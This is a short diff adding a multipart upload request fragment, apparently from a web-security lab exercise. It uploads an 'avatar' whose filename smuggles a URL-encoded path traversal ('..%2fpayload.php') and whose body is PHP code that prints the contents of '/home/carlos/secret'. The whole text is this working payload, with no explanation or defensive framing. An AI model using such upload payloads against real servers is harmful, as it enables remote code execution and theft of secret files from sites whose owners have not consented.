@@ -1,0 +1,4 @@
+Content-Disposition: form-data; name="avatar"; filename="..%2fpayload.php"
+Content-Type: application/x-php
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
